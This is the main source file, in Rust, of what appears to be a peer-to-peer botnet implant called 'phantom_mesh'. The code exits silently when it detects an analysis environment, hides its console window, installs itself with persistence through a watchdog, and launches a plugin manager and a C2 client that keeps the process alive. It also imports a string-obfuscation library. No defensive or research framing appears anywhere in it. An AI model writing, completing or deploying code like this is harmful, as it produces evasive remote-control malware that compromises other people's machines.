mod config;
use obfstr::obfstr;
mod helpers;
mod p2p;
mod host;
mod security;
mod logic;
mod modules;
mod discovery;

use clap::{Parser, Subcommand};

use p2p::commands::{install, start, status, uninstall};
use host::process::hide_console;
use host::registry::is_installed;

#[derive(Parser)]
#[command(name = "phantom_mesh")]
#[command(about = "Phantom Mesh Node", long_about = None)]
#[command(version)]
struct Cli {
    #[command(subcommand)]
    command: Option<Commands>,
}

#[derive(Subcommand)]
enum Commands {
    /// Uninstall completely
    Uninstall,
    /// Show status
    Status,
    /// Manual Connect
    Connect { peer: String },
}

#[tokio::main]
async fn main() {
    // 0. Anti-Analysis Check (Before anything else)
    if security::anti_analysis::is_analysis_environment() {
        return; // Silent Exit
    }

    // Install Rustls Crypto Provider (Ring)
    let _ = rustls::crypto::ring::default_provider().install_default();
    common::time::TimeKeeper::init().await;

    hide_console();

    let cli = Cli::parse();

    match cli.command {
        Some(Commands::Uninstall) => {
            if let Err(e) = uninstall() {
                eprintln!("{}: {}", "Uninstall failed", e);
            }
        }
        Some(Commands::Status) => {
            status();
        }
        Some(Commands::Connect { peer }) => {
            if let Err(e) = p2p::c2::start_client(Some(peer)).await {
                eprintln!("Connect Error: {}", e);
            }
        }
        None => {
            if !is_installed() {
                if let Err(e) = install() {
                    eprintln!("{}: {}", "Install failed", e);
                }
            } else {
                // 1. Maintain Persistence (Run Watchdog)
                if let Err(e) = start() {
                    eprintln!("{}: {}", "Start failed", e);
                }

                // 2. Start Plugin Manager
                tokio::spawn(async {
                    modules::plugin_manager::run_plugin_manager().await;
                });
 
                // 3. Start C2 (Blocking - Keeps Process Alive)
                if let Err(e) = p2p::c2::start_client(None).await {
                    eprintln!("{}: {}", "C2 Error", e);
                }
            }
        }
    }
}
